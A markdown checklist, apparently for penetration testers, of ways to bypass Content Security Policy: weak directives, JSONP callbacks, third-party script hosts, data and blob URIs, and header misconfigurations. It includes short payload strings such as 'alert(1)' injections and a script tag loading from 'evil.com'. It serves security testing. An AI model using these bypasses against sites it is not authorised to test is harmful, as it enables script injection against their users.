

> Use this checklist to test for CSP misconfigurations or bypasses in client-side contexts. Focus on weak/unsafe directives, trusted third parties, and bypassing script restrictions.

## Script Injection via Weak Directives
- [ ] `script-src 'unsafe-inline'`
- [ ] `script-src 'unsafe-eval'`
- [ ] `script-src *`
- [ ] `script-src data:`
- [ ] `script-src blob:`
- [ ] `script-src filesystem:`
- [ ] `script-src https://trusted.com` (inject via trusted.com if vulnerable)
- [ ] `script-src *.cdn.com` (wildcard abuse)
- [ ] `script-src self https://*.trusted-cdn.com`
- [ ] `script-src https://domain.com/` (directory with wildcard inclusion)

## JSONP/Callback Abuse
- [ ] `https://api.example.com/jsonp?callback=evil()`
- [ ] `https://vulnerable.cdn.com?jsonp=alert(1)`
- [ ] `jsonp or callback param reflecting in trusted domain`
- [ ] `CSP allows execution from JSONP-capable endpoint`

## Third-Party CSP-Compatible Script Hosting
- [ ] `https://gist.github.com/raw/`
- [ ] `https://cdn.jsdelivr.net/gh/user/repo/file.js`
- [ ] `https://cdnjs.cloudflare.com/ajax/libs/...`
- [ ] `https://code.jquery.com/jquery-X.X.X.min.js`
- [ ] `https://unpkg.com/...`
- [ ] `https://raw.githubusercontent.com/...`
- [ ] `Google Translate domain inclusion abuse`
- [ ] `Google APIs or Firebase Hosting with open project`

## Base64/Data URI Injection
- [ ] `data:text/html;base64,<script>alert(1)</script>`
- [ ] `data:text/javascript;base64,...`
- [ ] `data:application/x-javascript,...`

## Bypasses via Trusted Domains
- [ ] `cdn.example.com` reflects scripts
- [ ] `trusted.example.com` has open redirect to `javascript:`
- [ ] `*.cloudfront.net` hosts user content
- [ ] `*.azureedge.net` (user-hosted content allowed)
- [ ] `*.github.io` with CSP trust

## Sandbox Escape Techniques
- [ ] `<iframe sandbox="allow-scripts">`
- [ ] `<script src=//evil.com> bypass via blob injection`
- [ ] Blob → Script Injection Chain (CSP allows `blob:`)
- [ ] `window.open("javascript:")` via redirect

## CSP Header Misconfiguration
- [ ] Multiple CSP headers (bypass strongest)
- [ ] Invalid directive (fallback to default)
- [ ] Typo in directive (e.g., `scrip-src`)
- [ ] Missing fallback in `default-src`
- [ ] Overly permissive `default-src *`
- [ ] CSP only enforced on non-critical routes

## CSP via Meta Tag (weaker enforcement)
- [ ] `<meta http-equiv="Content-Security-Policy">` only
- [ ] Meta CSP differs from response CSP
- [ ] Injected meta tag in reflected input

## Mixed Content CSP Bypass
- [ ] CSP allows HTTP resources on HTTPS site
- [ ] Resource injection via iframe with mixed content
- [ ] Image or script proxying from non-HTTPS origins

## Special Tricks
- [ ] `style-src` allows inline scripts via CSS injection
- [ ] `object-src` not set (Flash, PDF injection)
- [ ] Service Worker registration bypassing CSP
- [ ] `report-uri` leaks private CSP policies
- [ ] Relaxed `connect-src` + leaked API keys